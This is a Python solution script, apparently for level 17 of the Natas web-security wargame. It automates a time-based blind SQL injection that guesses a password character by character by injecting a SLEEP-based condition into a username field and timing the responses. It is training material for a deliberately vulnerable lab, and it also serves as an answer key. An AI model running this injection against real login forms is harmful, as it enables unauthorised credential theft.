import re
from src.natas.base_level import NatasLevel
import string

class Level_17(NatasLevel):

  num = 17
  explanation = "On this level, a time-based blind SQL injection uses IF(condition, SLEEP(3), 0)\n     to identify correct password characters by measuring the response time."

  def exploit(self) -> str:

    CHARS  = string.ascii_letters + string.digits
    PASSWD = ""

    while True:

      FOUND = False

      for i in range(len(CHARS)):
        char    = CHARS[i]
        PAYLOAD = f"""natas18" AND IF(password LIKE BINARY '{PASSWD}{char}%', SLEEP(3), 0)-- -"""
        resp    = self.session.post(self.base_url + "/index.php", data = {"username": PAYLOAD})
        if resp.elapsed.total_seconds() >= 2:
          PASSWD += char
          FOUND   = True
          break

      if not FOUND:
        break

    return PASSWD
